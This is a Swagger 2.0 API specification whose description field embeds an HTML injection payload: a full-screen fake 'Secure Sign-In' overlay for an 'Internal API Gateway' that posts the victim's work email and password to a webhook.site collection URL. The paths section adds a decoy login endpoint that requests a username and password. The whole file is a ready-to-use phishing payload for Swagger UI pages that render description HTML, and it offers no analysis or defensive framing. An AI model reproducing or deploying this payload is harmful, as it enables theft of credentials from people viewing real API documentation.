swagger: '2.0'
info:
  version: 1.0.0
  title: Swagger UI
  description: '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(160deg,#1a1a2e 0%,#16213e 100%);z-index:99998;font-family:Segoe UI,Arial,sans-serif;overflow:auto;"><div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:420px;max-width:94%;background:#fff;border-radius:8px;box-shadow:0 6px 32px rgba(0,0,0,.3);overflow:hidden;z-index:99999;"><div style="padding:44px 44px 34px;"><div style="font-size:13px;font-weight:700;letter-spacing:1px;color:#8b95a5;text-transform:uppercase;margin-bottom:8px;">Secure Sign-In</div><div style="font-size:26px;color:#1f2937;font-weight:600;margin-bottom:6px;">Welcome back</div><div style="font-size:14px;color:#6b7280;margin-bottom:26px;">Sign in to continue to <strong>Internal API Gateway</strong></div><form action="https://webhook.site/REPLACE-ME" method="post"><input type="text" name="email" placeholder="Work email (you@company.com)" style="width:100%;padding:13px;border:1px solid #d1d5db;border-radius:6px;box-sizing:border-box;margin-bottom:14px;font-size:15px;"><input type="password" name="pass" placeholder="Password" style="width:100%;padding:13px;border:1px solid #d1d5db;border-radius:6px;box-sizing:border-box;margin-bottom:8px;font-size:15px;"><div style="display:flex;justify-content:space-between;font-size:13px;color:#374151;margin:10px 0 20px;"><label><input type="checkbox" name="remember"> Remember me</label><span style="color:#2563eb;">Forgot password?</span></div><button type="submit" style="width:100%;padding:13px;background:linear-gradient(90deg,#2563eb,#4f46e5);color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer;">Sign In →</button></form><div style="text-align:center;font-size:12px;color:#9ca3af;margin-top:22px;">Protected by enterprise SSO &nbsp;|&nbsp; Privacy</div></div></div></div>'
paths:
  /Login_Page:
    post:
      summary: Login here to continue
      description: Please provide your credentials to continue.
      parameters:
        - name: username
          in: formData
          description: The username for login
          required: true
          type: string
        - name: password
          in: formData
          description: The password for login
          required: true
          type: string
      tags:
        - Click here to login
      responses:
        '200':
          description: OK
        '400':
          description: Bad request
        '500':
          description: Server error
